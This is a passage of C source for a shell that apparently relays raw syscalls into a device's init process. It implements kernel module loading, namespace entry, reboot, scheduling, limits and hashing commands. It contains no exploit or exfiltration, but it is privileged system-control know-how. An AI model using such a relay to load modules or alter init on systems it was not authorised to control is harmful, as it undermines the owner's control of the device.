                                                               &psdata, 64);
                                uint64_t psectors = 0;
                                if (pssz > 0) {
                                    psdata[pssz] = '\0';
                                    psectors = strtoull((char *)psdata, NULL, 10);
                                    free(psdata);
                                }

                                uint64_t pbytes = psectors * 512;
                                char psize_str[32];
                                if (pbytes >= (uint64_t)1024*1024*1024)
                                    snprintf(psize_str, sizeof(psize_str), "%.1fG",
                                             (double)pbytes / (1024.0*1024*1024));
                                else if (pbytes >= 1024*1024)
                                    snprintf(psize_str, sizeof(psize_str), "%.1fM",
                                             (double)pbytes / (1024.0*1024));
                                else
                                    snprintf(psize_str, sizeof(psize_str), "%lluB",
                                             (unsigned long long)pbytes);

                                printf("  %-14s %6s %4d %-8s\n",
                                       pname, psize_str, ro, "part");
                            }
                            pp += pr;
                        }
                    }
                    relay_close(sock, pfd);
                }
            }
            pos += d_reclen;
        }
    }
    relay_close(sock, dfd);
    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * NEW COMMANDS — Kernel modules (insmod, rmmod, modinfo)
 * ═══════════════════════════════════════════════════════════════════════════ */

/* insmod: load a kernel module */
static int cmd_insmod(int sock, int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "insmod: Usage: insmod <module.ko> [params...]\n");
        return 1;
    }

    char abs[CWD_SIZE];
    resolve_path(argv[1], abs);

    int64_t fd = relay_openat(sock, abs, MY_O_RDONLY, 0);
    if (fd < 0) {
        fprintf(stderr, "insmod: %s: %s\n", abs, errno_str((int)(-fd)));
        return 1;
    }

    char params[DATA_SIZE];
    params[0] = '\0';
    size_t poff = 0;
    for (int i = 2; i < argc; i++) {
        size_t alen = strlen(argv[i]);
        if (poff + alen + 2 >= sizeof(params)) break;
        if (poff > 0) params[poff++] = ' ';
        memcpy(params + poff, argv[i], alen);
        poff += alen;
    }
    params[poff] = '\0';

    /* finit_module(fd, params, flags=0) */
    uint8_t dbuf[DATA_SIZE];
    memset(dbuf, 0, sizeof(dbuf));
    memcpy(dbuf, params, poff + 1);

    int64_t ret = send_syscall(sock, SYS_finit_module,
                               (uint64_t)fd, 0, 0, 0, 0, 0,
                               FLAG_X1_DATA,
                               dbuf, poff + 1,
                               NULL, 0);
    relay_close(sock, fd);

    if (ret < 0) {
        fprintf(stderr, "insmod: %s: %s\n", abs, errno_str((int)(-ret)));
        return 1;
    }
    printf("insmod: loaded %s\n", abs);
    return 0;
}

/* rmmod: unload a kernel module */
static int cmd_rmmod(int sock, int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "rmmod: Usage: rmmod [-f] <module>\n");
        return 1;
    }

    int flags = 0;
    const char *name = NULL;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-f") == 0) {
            flags |= 1; /* O_TRUNC = force */
        } else {
            name = argv[i];
        }
    }

    if (!name) {
        fprintf(stderr, "rmmod: missing module name\n");
        return 1;
    }

    char modname[256];
    strncpy(modname, name, sizeof(modname) - 1);
    modname[sizeof(modname)-1] = '\0';
    char *dot = strstr(modname, ".ko");
    if (dot) *dot = '\0';
    for (char *p = modname; *p; p++) if (*p == '-') *p = '_';

    size_t nlen = strlen(modname) + 1;
    uint8_t dbuf[DATA_SIZE];
    memset(dbuf, 0, sizeof(dbuf));
    memcpy(dbuf, modname, nlen);

    int64_t ret = send_syscall(sock, SYS_delete_module,
                               0, (uint64_t)flags, 0, 0, 0, 0,
                               FLAG_X0_DATA,
                               dbuf, nlen,
                               NULL, 0);
    if (ret < 0) {
        fprintf(stderr, "rmmod: %s: %s\n", modname, errno_str((int)(-ret)));
        return 1;
    }
    printf("rmmod: unloaded %s\n", modname);
    return 0;
}

/* modinfo: show kernel module info from /sys/module */
static int cmd_modinfo(int sock, int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "modinfo: Usage: modinfo <module>\n");
        return 1;
    }

    char modname[256];
    strncpy(modname, argv[1], sizeof(modname) - 1);
    modname[sizeof(modname)-1] = '\0';
    char *dot = strstr(modname, ".ko");
    if (dot) *dot = '\0';
    for (char *p = modname; *p; p++) if (*p == '-') *p = '_';

    char basepath[CWD_SIZE];
    snprintf(basepath, sizeof(basepath), "/sys/module/%s", modname);

    uint8_t statbuf[128];
    if (relay_fstatat(sock, basepath, statbuf, sizeof(statbuf)) < 0) {
        fprintf(stderr, "modinfo: %s: module not loaded\n", modname);
        return 1;
    }

    printf("name:           %s\n", modname);

    const char *attrs[] = {"version", "srcversion", "description", "author",
                          "license", "firmware", NULL};
    for (int j = 0; attrs[j]; j++) {
        char attrpath[CWD_SIZE];
        snprintf(attrpath, sizeof(attrpath), "/sys/module/%s/%s", modname, attrs[j]);
        uint8_t *data;
        ssize_t sz = relay_read_file(sock, attrpath, &data, 1024);
        if (sz > 0) {
            data[sz] = '\0';
            if (sz > 0 && data[sz-1] == '\n') data[sz-1] = '\0';
            printf("%-16s%s\n", attrs[j], (char *)data);
            free(data);
        }
    }

    char csizepath[CWD_SIZE];
    snprintf(csizepath, sizeof(csizepath), "/sys/module/%s/coresize", modname);
    uint8_t *cdata;
    ssize_t csz = relay_read_file(sock, csizepath, &cdata, 64);
    if (csz > 0) {
        cdata[csz] = '\0';
        if (csz > 0 && cdata[csz-1] == '\n') cdata[csz-1] = '\0';
        printf("size:           %s\n", (char *)cdata);
        free(cdata);
    }

    char rcpath[CWD_SIZE];
    snprintf(rcpath, sizeof(rcpath), "/sys/module/%s/refcnt", modname);
    uint8_t *rdata;
    ssize_t rsz = relay_read_file(sock, rcpath, &rdata, 32);
    if (rsz > 0) {
        rdata[rsz] = '\0';
        if (rsz > 0 && rdata[rsz-1] == '\n') rdata[rsz-1] = '\0';
        printf("refcount:       %s\n", (char *)rdata);
        free(rdata);
    }

    char paramdir[CWD_SIZE];
    snprintf(paramdir, sizeof(paramdir), "/sys/module/%s/parameters", modname);
    int64_t pfd = relay_openat(sock, paramdir, MY_O_RDONLY | MY_O_DIRECTORY, 0);
    if (pfd >= 0) {
        for (;;) {
            uint8_t pbuf[DATA_SIZE];
            int64_t pn = relay_getdents64(sock, pfd, pbuf, DATA_SIZE);
            if (pn <= 0) break;
            size_t pp = 0;
            while (pp < (size_t)pn) {
                uint16_t pr = unpack_u32(pbuf + pp + 16) & 0xFFFF;
                const char *pname = (const char *)(pbuf + pp + 19);
                if (pr == 0) break;
                if (pname[0] != '.') {
                    char pvpath[CWD_SIZE];
                    snprintf(pvpath, sizeof(pvpath),
                             "/sys/module/%s/parameters/%s", modname, pname);
                    uint8_t *pvdata;
                    ssize_t pvsz = relay_read_file(sock, pvpath, &pvdata, 256);
                    if (pvsz > 0) {
                        pvdata[pvsz] = '\0';
                        if (pvsz > 0 && pvdata[pvsz-1] == '\n') pvdata[pvsz-1] = '\0';
                        printf("parm:           %s=%s\n", pname, (char *)pvdata);
                        free(pvdata);
                    } else {
                        printf("parm:           %s\n", pname);
                    }
                }
                pp += pr;
            }
        }
        relay_close(sock, pfd);
    }

    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * NEW COMMANDS — Process scheduling (nice, renice, ionice, taskset, ulimit)
 * ═══════════════════════════════════════════════════════════════════════════ */

/* nice: get/set scheduling priority */
static int cmd_nice(int sock, int argc, char *argv[]) {
    if (argc < 2) {
        /* Print current priority */
        int64_t prio = send_syscall(sock, SYS_getpriority,
                                    0, 0, 0, 0, 0, 0,
                                    0, NULL, 0, NULL, 0);
        printf("%lld\n", (long long)(20 - prio));
        return 0;
    }

    int niceval = 10;

    if (argc >= 3 && strcmp(argv[1], "-n") == 0) {
        niceval = atoi(argv[2]);
    } else {
        niceval = atoi(argv[1]);
    }

    /* setpriority(PRIO_PROCESS, 0, priority) */
    int64_t ret = send_syscall(sock, SYS_setpriority,
                               0, 0, (uint64_t)(unsigned)(niceval), 0, 0, 0,
                               0, NULL, 0, NULL, 0);
    if (ret < 0) {
        fprintf(stderr, "nice: setpriority: %s\n", errno_str((int)(-ret)));
        return 1;
    }
    printf("nice: priority set to %d for init process\n", niceval);
    return 0;
}

/* renice: alter priority of running processes */
static int cmd_renice(int sock, int argc, char *argv[]) {
    if (argc < 3) {
        fprintf(stderr, "renice: Usage: renice [-n] <priority> [-p] <pid...>\n");
        return 1;
    }

    int priority = 0;
    int arg_start = 1;
    int ret = 0;

    if (strcmp(argv[1], "-n") == 0 && argc >= 4) {
        priority = atoi(argv[2]);
        arg_start = 3;
    } else {
        priority = atoi(argv[1]);
        arg_start = 2;
    }

    for (int i = arg_start; i < argc; i++) {
        if (strcmp(argv[i], "-p") == 0) continue;
        int pid = atoi(argv[i]);
        if (pid <= 0) {
            fprintf(stderr, "renice: invalid pid: %s\n", argv[i]);
            ret = 1;
            continue;
        }

        int64_t r = send_syscall(sock, SYS_setpriority,
                                 0, (uint64_t)pid, (uint64_t)(unsigned)(priority),
                                 0, 0, 0,
                                 0, NULL, 0, NULL, 0);
        if (r < 0) {
            fprintf(stderr, "renice: pid %d: %s\n", pid, errno_str((int)(-r)));
            ret = 1;
        } else {
            printf("%d: new priority %d\n", pid, priority);
        }
    }
    return ret;
}

/* ionice: get/set I/O scheduling class and priority */
static int cmd_ionice(int sock, int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "ionice: Usage: ionice [-c class] [-n level] [-p pid]\n"
                        "  Classes: 0=none 1=realtime 2=best-effort 3=idle\n");
        return 1;
    }

    int io_class = -1;
    int io_level = -1;
    int pid = 0;
    int set_mode = 0;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-c") == 0 && i + 1 < argc) {
            io_class = atoi(argv[++i]);
            set_mode = 1;
        } else if (strcmp(argv[i], "-n") == 0 && i + 1 < argc) {
            io_level = atoi(argv[++i]);
            set_mode = 1;
        } else if (strcmp(argv[i], "-p") == 0 && i + 1 < argc) {
            pid = atoi(argv[++i]);
        }
    }

    if (set_mode) {
        if (io_class < 0) io_class = 2;
        if (io_level < 0) io_level = 4;
        uint64_t ioprio = (uint64_t)((io_class << 13) | io_level);

        int64_t ret = send_syscall(sock, SYS_ioprio_set,
                                   1, (uint64_t)pid, ioprio, 0, 0, 0,
                                   0, NULL, 0, NULL, 0);
        if (ret < 0) {
            fprintf(stderr, "ionice: %s\n", errno_str((int)(-ret)));
            return 1;
        }
    } else {
        int64_t ioprio = send_syscall(sock, SYS_ioprio_get,
                                      1, (uint64_t)pid, 0, 0, 0, 0,
                                      0, NULL, 0, NULL, 0);
        if (ioprio < 0) {
            fprintf(stderr, "ionice: %s\n", errno_str((int)(-ioprio)));
            return 1;
        }

        int cls = (int)((ioprio >> 13) & 3);
        int lvl = (int)(ioprio & 0x1FFF);
        const char *clsname[] = {"none", "realtime", "best-effort", "idle"};
        if (cls == 0)
            printf("none\n");
        else
            printf("%s: prio %d\n", clsname[cls], lvl);
    }
    return 0;
}

/* taskset: get/set CPU affinity */
static int cmd_taskset(int sock, int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "taskset: Usage: taskset [-p] <mask> <pid>\n"
                        "         taskset -p <pid> (get)\n");
        return 1;
    }

    int pid = 0;
    uint64_t mask = 0;
    int get_mode = 0;

    if (strcmp(argv[1], "-p") == 0) {
        if (argc == 3) {
            pid = atoi(argv[2]);
            get_mode = 1;
        } else if (argc >= 4) {
            mask = strtoull(argv[2], NULL, 16);
            pid = atoi(argv[3]);
        }
    } else {
        mask = strtoull(argv[1], NULL, 16);
        if (argc >= 3) pid = atoi(argv[2]);
    }

    if (get_mode) {
        uint8_t resp[DATA_SIZE];
        memset(resp, 0, sizeof(resp));
        int64_t ret = send_syscall(sock, SYS_sched_getaffinity,
                                   (uint64_t)pid, 8, 0, 0, 0, 0,
                                   FLAG_X2_DATA,
                                   NULL, 0,
                                   resp, 8);
        if (ret < 0) {
            fprintf(stderr, "taskset: pid %d: %s\n", pid, errno_str((int)(-ret)));
            return 1;
        }
        uint64_t affinity = unpack_u64(resp);
        printf("pid %d's current affinity mask: %llx\n", pid,
               (unsigned long long)affinity);
    } else {
        uint8_t dbuf[DATA_SIZE];
        memset(dbuf, 0, sizeof(dbuf));
        pack_u64(dbuf, mask);

        int64_t ret = send_syscall(sock, SYS_sched_setaffinity,
                                   (uint64_t)pid, 8, 0, 0, 0, 0,
                                   FLAG_X2_DATA,
                                   dbuf, 8,
                                   NULL, 0);
        if (ret < 0) {
            fprintf(stderr, "taskset: pid %d: %s\n", pid, errno_str((int)(-ret)));
            return 1;
        }
        printf("pid %d's new affinity mask: %llx\n", pid, (unsigned long long)mask);
    }
    return 0;
}

/* ulimit: get/set resource limits */
static int cmd_ulimit(int sock, int argc, char *argv[]) {
    int set_mode = 0;
    uint64_t new_limit = 0;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-a") == 0) {
            relay_cat_file(sock, "/proc/self/limits");
            return 0;
        } else if (argv[i][0] != '-') {
            if (strcmp(argv[i], "unlimited") == 0) {
                new_limit = (uint64_t)-1;
            } else {
                new_limit = strtoull(argv[i], NULL, 10);
            }
            set_mode = 1;
        }
    }

    /* Determine resource from flags */
    int resource = 7; /* RLIMIT_NOFILE default */
    for (int i = 1; i < argc; i++) {
        if (argv[i][0] == '-' && argv[i][1] && !argv[i][2]) {
            switch (argv[i][1]) {
            case 't': resource = 0; break;  /* CPU */
            case 'f': resource = 1; break;  /* FSIZE */
            case 'd': resource = 2; break;  /* DATA */
            case 's': resource = 3; break;  /* STACK */
            case 'c': resource = 4; break;  /* CORE */
            case 'm': resource = 5; break;  /* RSS */
            case 'u': resource = 6; break;  /* NPROC */
            case 'n': resource = 7; break;  /* NOFILE */
            case 'l': resource = 8; break;  /* MEMLOCK */
            case 'v': resource = 9; break;  /* AS */
            case 'x': resource = 10; break; /* LOCKS */
            case 'i': resource = 11; break; /* SIGPENDING */
            case 'q': resource = 12; break; /* MSGQUEUE */
            case 'e': resource = 13; break; /* NICE */
            case 'r': resource = 14; break; /* RTPRIO */
            }
        }
    }

    if (set_mode) {
        uint8_t dbuf[DATA_SIZE];
        memset(dbuf, 0, sizeof(dbuf));
        pack_u64(dbuf, new_limit);
        pack_u64(dbuf + 8, new_limit);

        int64_t ret = send_syscall(sock, SYS_prlimit64,
                                   0, (uint64_t)resource, 0, 0, 0, 0,
                                   FLAG_X2_DATA,
                                   dbuf, 16,
                                   NULL, 0);
        if (ret < 0) {
            fprintf(stderr, "ulimit: %s\n", errno_str((int)(-ret)));
            return 1;
        }
        return 0;
    }

    /* Get mode */
    relay_cat_file(sock, "/proc/self/limits");
    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * NEW COMMANDS — System control (reboot, tty, unshare, nsenter, getcap)
 * ═══════════════════════════════════════════════════════════════════════════ */

/* reboot: reboot or power off the system */
static int cmd_reboot(int sock, int argc, char *argv[]) {
    uint64_t magic1 = 0xfee1dead;
    uint64_t magic2 = 0x28121969;
    uint64_t cmd_val = 0x01234567; /* LINUX_REBOOT_CMD_RESTART */
    int force = 0;

    if (argc >= 2) {
        if (strcmp(argv[1], "-p") == 0 || strcmp(argv[1], "poweroff") == 0) {
            cmd_val = 0x4321FEDC; /* LINUX_REBOOT_CMD_POWER_OFF */
        } else if (strcmp(argv[1], "soft") == 0) {
            printf("reboot: use 'service call alarm 1' for soft reboot\n");
            return 0;
        } else if (strcmp(argv[1], "-f") == 0 || strcmp(argv[1], "--force") == 0) {
            force = 1;
            if (argc >= 3 && (strcmp(argv[2], "-p") == 0 || strcmp(argv[2], "poweroff") == 0))
                cmd_val = 0x4321FEDC;
        }
    }

    /* SAFETY: require confirmation unless -f is passed */
    if (!force) {
        printf("reboot: this will reboot the device. Use 'reboot -f' to confirm.\n");
        return 1;
    }

    printf("reboot: syncing filesystems...\n");
    fflush(stdout);
    send_syscall(sock, SYS_sync, 0, 0, 0, 0, 0, 0, 0, NULL, 0, NULL, 0);

    printf("reboot: rebooting...\n");
    fflush(stdout);

    int64_t ret = send_syscall(sock, SYS_reboot,
                               magic1, magic2, cmd_val, 0, 0, 0,
                               0, NULL, 0, NULL, 0);
    if (ret < 0) {
        fprintf(stderr, "reboot: %s\n", errno_str((int)(-ret)));
        return 1;
    }
    return 0;
}

/* tty: print terminal name */
static int cmd_tty(int sock, int argc, char *argv[]) {
    (void)argc; (void)argv;
    char link[CWD_SIZE];
    int64_t n = relay_readlinkat(sock, "/proc/self/fd/0", link, sizeof(link));
    if (n > 0) {
        printf("%s\n", link);
    } else {
        printf("not a tty\n");
    }
    return 0;
}

/* unshare: unshare namespaces */
static int cmd_unshare(int sock, int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "unshare: Usage: unshare [-m] [-u] [-i] [-n] [-p] [-U]\n"
                        "  -m  mount namespace\n"
                        "  -u  UTS namespace\n"
                        "  -i  IPC namespace\n"
                        "  -n  network namespace\n"
                        "  -p  PID namespace\n"
                        "  -U  user namespace\n");
        return 1;
    }

    int flags = 0;
    for (int i = 1; i < argc; i++) {
        if (argv[i][0] == '-') {
            for (const char *f = argv[i] + 1; *f; f++) {
                switch (*f) {
                case 'm': flags |= 0x00020000; break; /* CLONE_NEWNS */
                case 'u': flags |= 0x04000000; break; /* CLONE_NEWUTS */
                case 'i': flags |= 0x08000000; break; /* CLONE_NEWIPC */
                case 'n': flags |= 0x40000000; break; /* CLONE_NEWNET */
                case 'p': flags |= 0x20000000; break; /* CLONE_NEWPID */
                case 'U': flags |= 0x10000000; break; /* CLONE_NEWUSER */
                default:
                    fprintf(stderr, "unshare: unknown flag: -%c\n", *f);
                    return 1;
                }
            }
        }
    }

    /* SAFETY: warn that this modifies init's OWN namespaces (irreversible) */
    fprintf(stderr, "WARNING: unshare modifies init's namespaces. This is IRREVERSIBLE\n"
                    "and may cause init to malfunction. Proceeding...\n");

    int64_t ret = send_syscall(sock, SYS_unshare,
                               (uint64_t)flags, 0, 0, 0, 0, 0,
                               0, NULL, 0, NULL, 0);
    if (ret < 0) {
        fprintf(stderr, "unshare: %s\n", errno_str((int)(-ret)));
        return 1;
    }
    printf("unshare: namespaces unshared (flags=0x%x)\n", flags);
    return 0;
}

/* nsenter: enter namespace of another process */
static int cmd_nsenter(int sock, int argc, char *argv[]) {
    if (argc < 3) {
        fprintf(stderr, "nsenter: Usage: nsenter -t <pid> [-m] [-u] [-i] [-n] [-p]\n");
        return 1;
    }

    int target_pid = 0;
    int ns_types = 0;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-t") == 0 && i + 1 < argc) {
            target_pid = atoi(argv[++i]);
        } else if (argv[i][0] == '-') {
            for (const char *f = argv[i] + 1; *f; f++) {
                switch (*f) {
                case 'm': ns_types |= 1; break;
                case 'u': ns_types |= 2; break;
                case 'i': ns_types |= 4; break;
                case 'n': ns_types |= 8; break;
                case 'p': ns_types |= 16; break;
                }
            }
        }
    }

    if (target_pid <= 0) {
        fprintf(stderr, "nsenter: missing -t <pid>\n");
        return 1;
    }

    if (ns_types == 0) ns_types = 0x1F;

    /* SAFETY: warn that this changes init's OWN namespace memberships */
    fprintf(stderr, "WARNING: nsenter changes init's namespace memberships. This is IRREVERSIBLE\n"
                    "and may cause init to malfunction. Proceeding...\n");

    static const struct {
        int bit;
        const char *name;
        int clone_flag;
    } ns_map[] = {
        {1,  "mnt",  0x00020000},
        {2,  "uts",  0x04000000},
        {4,  "ipc",  0x08000000},
        {8,  "net",  0x40000000},
        {16, "pid",  0x20000000},
        {0, NULL, 0}
    };

    int ret = 0;
    for (int j = 0; ns_map[j].name; j++) {
        if (!(ns_types & ns_map[j].bit)) continue;

        char nspath[CWD_SIZE];
        snprintf(nspath, sizeof(nspath), "/proc/%d/ns/%s", target_pid, ns_map[j].name);

        int64_t fd = relay_openat(sock, nspath, MY_O_RDONLY, 0);
        if (fd < 0) {
            fprintf(stderr, "nsenter: cannot open %s: %s\n",
                    nspath, errno_str((int)(-fd)));
            ret = 1;
            continue;
        }

        int64_t r = send_syscall(sock, SYS_setns,
                                 (uint64_t)fd, (uint64_t)ns_map[j].clone_flag,
                                 0, 0, 0, 0,
                                 0, NULL, 0, NULL, 0);
        relay_close(sock, fd);

        if (r < 0) {
            fprintf(stderr, "nsenter: setns(%s): %s\n",
                    ns_map[j].name, errno_str((int)(-r)));
            ret = 1;
        } else {
            printf("nsenter: entered %s namespace of pid %d\n",
                   ns_map[j].name, target_pid);
        }
    }
    return ret;
}

/* getcap: show process capabilities */
static int cmd_getcap(int sock, int argc, char *argv[]) {
    int pid = 0;
    if (argc >= 2) {
        if (strcmp(argv[1], "-p") == 0 && argc >= 3)
            pid = atoi(argv[2]);
        else
            pid = atoi(argv[1]);
    }

    char path[CWD_SIZE];
    if (pid > 0)
        snprintf(path, sizeof(path), "/proc/%d/status", pid);
    else
        snprintf(path, sizeof(path), "/proc/self/status");

    uint8_t *data;
    ssize_t sz = relay_read_file(sock, path, &data, 0);
    if (sz < 0) {
        fprintf(stderr, "getcap: cannot read %s\n", path);
        return 1;
    }

    printf("Process %d capabilities:\n", pid > 0 ? pid : 1);

    ssize_t line_start = 0;
    for (ssize_t j = 0; j <= sz; j++) {
        if (j == sz || data[j] == '\n') {
            size_t llen = (size_t)(j - line_start);
            if (llen > 3 && data[line_start] == 'C' && data[line_start+1] == 'a' &&
                data[line_start+2] == 'p') {
                char line[256];
                if (llen >= sizeof(line)) llen = sizeof(line) - 1;
                memcpy(line, data + line_start, llen);
                line[llen] = '\0';
                printf("  %s\n", line);
            }
            line_start = j + 1;
        }
    }
    free(data);
    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * NEW COMMANDS — Text/data processing (sha1sum, cksum, od, fold, factor, cal)
 * ═══════════════════════════════════════════════════════════════════════════ */

/* sha1sum: compute SHA-1 hash */
static int cmd_sha1sum(int sock, int argc, char *argv[]) {
    for (int fi = 1; fi < argc; fi++) {
        if (argv[fi][0] == '-') continue;

        char abs[CWD_SIZE];
        resolve_path(argv[fi], abs);

        int64_t fd = relay_openat(sock, abs, MY_O_RDONLY, 0);
        if (fd < 0) {
            fprintf(stderr, "sha1sum: %s: %s\n", abs, errno_str((int)(-fd)));
            continue;
        }

        uint32_t h0 = 0x67452301, h1 = 0xEFCDAB89;
        uint32_t h2 = 0x98BADCFE, h3 = 0x10325476;
        uint32_t h4 = 0xC3D2E1F0;

        uint64_t total_len = 0;
        uint8_t block[64];
        int block_pos = 0;
        int eof_reached = 0;

        while (!eof_reached) {
            uint8_t buf[DATA_SIZE];
            int64_t n = relay_read(sock, fd, buf, DATA_SIZE);

            if (n <= 0) {
                /* Padding */
                block[block_pos++] = 0x80;
                if (block_pos > 56) {
                    while (block_pos < 64) block[block_pos++] = 0;
                    /* Process full block */
                    uint32_t w[80];
                    for (int t = 0; t < 16; t++)
                        w[t] = ((uint32_t)block[t*4]<<24)|((uint32_t)block[t*4+1]<<16)|
                               ((uint32_t)block[t*4+2]<<8)|(uint32_t)block[t*4+3];
                    for (int t = 16; t < 80; t++) {
                        uint32_t tmp = w[t-3]^w[t-8]^w[t-14]^w[t-16];
                        w[t] = (tmp<<1)|(tmp>>31);
                    }
                    uint32_t a=h0,b=h1,c=h2,d=h3,e=h4;
                    for (int t = 0; t < 80; t++) {
                        uint32_t f,k;
                        if (t<20){f=(b&c)|((~b)&d);k=0x5A827999;}
                        else if(t<40){f=b^c^d;k=0x6ED9EBA1;}
                        else if(t<60){f=(b&c)|(b&d)|(c&d);k=0x8F1BBCDC;}
                        else{f=b^c^d;k=0xCA62C1D6;}
                        uint32_t temp=((a<<5)|(a>>27))+f+e+k+w[t];
                        e=d;d=c;c=(b<<30)|(b>>2);b=a;a=temp;
                    }
                    h0+=a;h1+=b;h2+=c;h3+=d;h4+=e;
                    block_pos = 0;
                }
                while (block_pos < 56) block[block_pos++] = 0;
                uint64_t bit_len = total_len * 8;
                block[56]=(uint8_t)(bit_len>>56); block[57]=(uint8_t)(bit_len>>48);
                block[58]=(uint8_t)(bit_len>>40); block[59]=(uint8_t)(bit_len>>32);
                block[60]=(uint8_t)(bit_len>>24); block[61]=(uint8_t)(bit_len>>16);
                block[62]=(uint8_t)(bit_len>>8);  block[63]=(uint8_t)(bit_len);
                /* Process final block */
                uint32_t w[80];
                for (int t = 0; t < 16; t++)
                    w[t] = ((uint32_t)block[t*4]<<24)|((uint32_t)block[t*4+1]<<16)|
                           ((uint32_t)block[t*4+2]<<8)|(uint32_t)block[t*4+3];
                for (int t = 16; t < 80; t++) {
                    uint32_t tmp = w[t-3]^w[t-8]^w[t-14]^w[t-16];
                    w[t] = (tmp<<1)|(tmp>>31);
                }
                uint32_t a=h0,b=h1,c=h2,d=h3,e=h4;
                for (int t = 0; t < 80; t++) {
                    uint32_t f,k;
                    if (t<20){f=(b&c)|((~b)&d);k=0x5A827999;}
                    else if(t<40){f=b^c^d;k=0x6ED9EBA1;}
                    else if(t<60){f=(b&c)|(b&d)|(c&d);k=0x8F1BBCDC;}
                    else{f=b^c^d;k=0xCA62C1D6;}
                    uint32_t temp=((a<<5)|(a>>27))+f+e+k+w[t];
                    e=d;d=c;c=(b<<30)|(b>>2);b=a;a=temp;
                }
                h0+=a;h1+=b;h2+=c;h3+=d;h4+=e;
                eof_reached = 1;
                break;
            }

            total_len += (uint64_t)n;
            for (int64_t i = 0; i < n; i++) {
                block[block_pos++] = buf[i];
                if (block_pos == 64) {
                    uint32_t w[80];
                    for (int t = 0; t < 16; t++)
                        w[t] = ((uint32_t)block[t*4]<<24)|((uint32_t)block[t*4+1]<<16)|
                               ((uint32_t)block[t*4+2]<<8)|(uint32_t)block[t*4+3];
                    for (int t = 16; t < 80; t++) {
                        uint32_t tmp = w[t-3]^w[t-8]^w[t-14]^w[t-16];
                        w[t] = (tmp<<1)|(tmp>>31);
                    }
                    uint32_t a=h0,b=h1,c=h2,d=h3,e=h4;
                    for (int t = 0; t < 80; t++) {
                        uint32_t f,k;
                        if (t<20){f=(b&c)|((~b)&d);k=0x5A827999;}
                        else if(t<40){f=b^c^d;k=0x6ED9EBA1;}
                        else if(t<60){f=(b&c)|(b&d)|(c&d);k=0x8F1BBCDC;}
                        else{f=b^c^d;k=0xCA62C1D6;}
                        uint32_t temp=((a<<5)|(a>>27))+f+e+k+w[t];
                        e=d;d=c;c=(b<<30)|(b>>2);b=a;a=temp;
                    }
                    h0+=a;h1+=b;h2+=c;h3+=d;h4+=e;
                    block_pos = 0;
                }
            }
        }

        relay_close(sock, fd);
        printf("%08x%08x%08x%08x%08x  %s\n", h0, h1, h2, h3, h4, abs);
    }
    return 0;
}

/* cksum: compute CRC-32 checksum (POSIX cksum) */
static int cmd_cksum(int sock, int argc, char *argv[]) {
    static uint32_t crc_table[256];
    static int table_init = 0;
    if (!table_init) {
        for (int i = 0; i < 256; i++) {
            uint32_t c = (uint32_t)i << 24;
            for (int j = 0; j < 8; j++) {
                if (c & 0x80000000) c = (c << 1) ^ 0x04C11DB7;
                else c = c << 1;
            }
            crc_table[i] = c;
        }
        table_init = 1;
    }

    for (int fi = 1; fi < argc; fi++) {
        if (argv[fi][0] == '-') continue;

        char abs[CWD_SIZE];
        resolve_path(argv[fi], abs);

        int64_t fd = relay_openat(sock, abs, MY_O_RDONLY, 0);
        if (fd < 0) {
            fprintf(stderr, "cksum: %s: %s\n", abs, errno_str((int)(-fd)));
            continue;
        }

        uint32_t crc = 0;
        uint64_t total = 0;

        for (;;) {
            uint8_t buf[DATA_SIZE];
            int64_t n = relay_read(sock, fd, buf, DATA_SIZE);
            if (n <= 0) break;
            total += (uint64_t)n;
            for (int64_t i = 0; i < n; i++)
                crc = (crc << 8) ^ crc_table[((crc >> 24) ^ buf[i]) & 0xFF];
        }

        uint64_t len = total;
        while (len > 0) {
            crc = (crc << 8) ^ crc_table[((crc >> 24) ^ (len & 0xFF)) & 0xFF];
            len >>= 8;
        }
        crc = ~crc;

        relay_close(sock, fd);
        printf("%u %llu %s\n", crc, (unsigned long long)total, abs);
    }
    return 0;
}

/* od: octal/hex dump */
static int cmd_od(int sock, int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "od: Usage: od [-A adfox] [-t adfoux] [-x] [-c] [-N count] <file>\n");
        return 1;
    }

    char addr_fmt = 'o';
    char data_fmt = 'o';
    int max_bytes = -1;
    const char *filepath = NULL;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-A") == 0 && i + 1 < argc) { addr_fmt = argv[++i][0]; }
        else if (strcmp(argv[i], "-t") == 0 && i + 1 < argc) { data_fmt = argv[++i][0]; }
        else if (strcmp(argv[i], "-x") == 0) { data_fmt = 'x'; }
        else if (strcmp(argv[i], "-d") == 0) { data_fmt = 'u'; }
        else if (strcmp(argv[i], "-c") == 0) { data_fmt = 'c'; }
        else if (strcmp(argv[i], "-N") == 0 && i + 1 < argc) { max_bytes = atoi(argv[++i]); }
        else if (argv[i][0] != '-') { filepath = argv[i]; }
    }

    if (!filepath) { fprintf(stderr, "od: missing file\n"); return 1; }

    char abs[CWD_SIZE];
    resolve_path(filepath, abs);

    int64_t fd = relay_openat(sock, abs, MY_O_RDONLY, 0);
    if (fd < 0) {
        fprintf(stderr, "od: %s: %s\n", abs, errno_str((int)(-fd)));
        return 1;
    }

    uint64_t offset = 0;
    int done = 0;

    while (!done) {
        if (g_sigint) { g_sigint = 0; break; }
        uint8_t buf[DATA_SIZE];
        int64_t n = relay_read(sock, fd, buf, DATA_SIZE);
        if (n <= 0) break;

        for (int64_t i = 0; i < n; i += 16) {
            if (max_bytes >= 0 && (int64_t)(offset + (uint64_t)i) >= max_bytes) {
                done = 1; break;
            }

            if (addr_fmt == 'x') printf("%07llx", (unsigned long long)(offset+(uint64_t)i));
            else if (addr_fmt == 'd') printf("%07lld", (long long)(offset+(uint64_t)i));
            else printf("%07llo", (unsigned long long)(offset+(uint64_t)i));

